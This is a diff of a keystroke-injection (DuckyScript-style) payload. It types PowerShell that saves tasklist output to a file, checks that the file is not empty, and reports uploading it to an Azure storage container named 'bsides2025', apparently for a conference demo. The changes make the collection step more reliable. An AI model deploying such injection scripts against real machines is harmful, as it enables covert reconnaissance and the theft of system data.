@@ -12,15 +12,15 @@ STRING echo HELLO HELLO HELLO
 ENTER
 DELAY 1000
 
-STRING $storageAccount = "bsides2025"; $storageKey = "KEY GOES HERE"; $containerName = "files"; $fileName = "tasklist.txt"; tasklist /svc /v > $fileName;
+STRING $storageAccount = "bsides2025"; $storageKey = "KEY GOES HERE"; $containerName = "files"; $fileName = "tasklist.txt"; tasklist /svc > $fileName; tasklist /v >> $fileName;
 ENTER
-DELAY 1000
+DELAY 10000
 
 STRING if (Test-Path $fileName) { Write-Host "File created successfully" } else { Write-Host "File creation failed"; exit }
 ENTER
 DELAY 1000
 
-STRING $fileContent = Get-Content -Path $fileName -Raw;
+STRING $fileContent = Get-Content -Path $fileName -Raw; if ([string]::IsNullOrEmpty($fileContent)) { Write-Host "File is empty!"; exit }
 ENTER
 DELAY 1000
 
@@ -51,6 +51,3 @@ DELAY 1000
 STRING Write-Host "File uploaded successfully to: $uri"
 ENTER
 DELAY 1000
-
-STRING exit
-ENTER
